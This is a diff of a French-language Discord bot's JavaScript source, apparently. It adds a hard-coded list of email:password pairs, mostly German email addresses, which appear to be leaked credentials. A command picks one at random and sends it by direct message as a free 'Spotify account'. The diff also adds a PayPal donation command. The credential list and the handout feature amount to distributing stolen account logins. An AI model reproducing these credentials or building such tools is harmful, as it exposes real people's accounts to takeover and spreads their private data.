+"liam-cesar@gmx.de:Lukas123",
+"liamtoh_@hotmail.de:Adsfadsf123",
+"liamtoh_@hotmail.de:kimberly",
+"lias-heuser@gmx.de:gammi123",
+"liasfh@hotmail.de:235d4034",
+"libanese.player.16@hotmail.de:samuelzahn",
+"libanese_2010@hotmail.de:zeaiter123",
+"libanesen-boy13@hotmail.de:libanon123",
+"libanon_x33@hotmail.de:gangbang",
+"libe-@hotmail.de:tannenbaum",
+"liberojannik@web.de:Jeffhardy1",
+"libuda19041@freenet.de:schalke04",
+"lexa35@hotmail.de:insidetm12"
+    //ne pas mettre de virgule "," pour le dernier compte 
+];
+
+let randomAnswerPicker = answers[Math.floor(Math.random() * answers.length)];
+  const embed = new Discord.RichEmbed()
+  .setFooter("Copyright © 2019 Endorium")
+  .addField('Voici ton compte Spotify(attention ils ne sont pas garantit !): ',
+  randomAnswerPicker)
+      .setColor("RANDOM")
+      .setImage("https://www.google.com/imgres?imgurl=https%3A%2F%2Fupload.wikimedia.org%2Fwikipedia%2Ffr%2Fd%2Fd1%2FSpotify_logo_sans_texte.svg.png&imgrefurl=https%3A%2F%2Ffr.wikipedia.org%2Fwiki%2FFichier%3ASpotify_logo_sans_texte.svg.png&docid=QM-70KOr77a2AM&tbnid=te4SqZietNuKAM%3A&vet=10ahUKEwiK34_wwLbhAhWxxYUKHVP3A24QMwhCKAMwAw..i&w=2000&h=2000&bih=789&biw=1600&q=logo%20spotify&ved=0ahUKEwiK34_wwLbhAhWxxYUKHVP3A24QMwhCKAMwAw&iact=mrc&uact=8")
+      .setTimestamp(30000)
+msg.channel.send(`**ton compte a bien été généré va voir tes mp **📥🔖`);
+msg.author.send({embed})
+}
+
+}
+});
+
+ 
+
+  if(command === "cagnotte") {
+    if (message.deletable) message.delete();
+      const embed = new Discord.RichEmbed()
+        .setFooter("Copyright Endorium 2019")
+        .addField("https://paypal.me/pools/c/8dsIJBzVSI","Pour Aidez a ce que le serveur ce developpe donne de l'argent !")
+        .setColor(0x1FDDE3)
+      message.channel.sendEmbed(embed)
+  }
 
 
 
@@ -682,8 +1275,8 @@ if(command === 'close'){
     });
 }
 })
-
-/*if (decomp_msg[0] === commands_prefix + "mute") {
+/*
+if (decomp_msg[0] === commands_prefix + "mute") {
   if(message.member.hasPermission("MANAGE_MESSAGES")) {
     if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("Vous n'avez pas la permissions");
     let mUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]))
